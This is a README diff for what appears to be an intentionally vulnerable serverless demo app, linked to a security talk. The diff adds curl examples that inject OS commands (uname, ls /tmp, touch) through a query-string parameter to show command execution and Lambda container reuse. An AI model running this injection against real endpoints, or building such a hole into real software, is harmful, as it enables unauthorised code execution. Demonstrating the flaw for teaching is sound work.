@@ -9,6 +9,22 @@ This first release only contains arbitrary code execution through the query stri
 
 See Velocity preso > http://www.slideshare.net/wickett/serverless-security-are-you-ready-for-the-future
 
+## Example CMDEXE
+
+You can pass OS commands in the query string args
+```
+$ curl “https://XXXX.execute-api.us-east-1.amazonaws.com/prod/lambhack/c?args=uname+-a;+sleep+1"
+```
+
+Lambda container reuse in action
+```
+$ curl “https://XXXX.execute-api.us-east-1.amazonaws.com/prod/lambhack/c?args=ls+/tmp;+sleep+1"
+
+$ curl “https://XXXX.execute-api.us-east-1.amazonaws.com/prod/lambhack/c?args=touch+/tmp/wickettfile;+sleep+1”
+
+$ curl “https://XXXX.execute-api.us-east-1.amazonaws.com/prod/lambhack/args=ls+/tmp;+sleep+1"
+```
+
 ## Setup
 
 ```
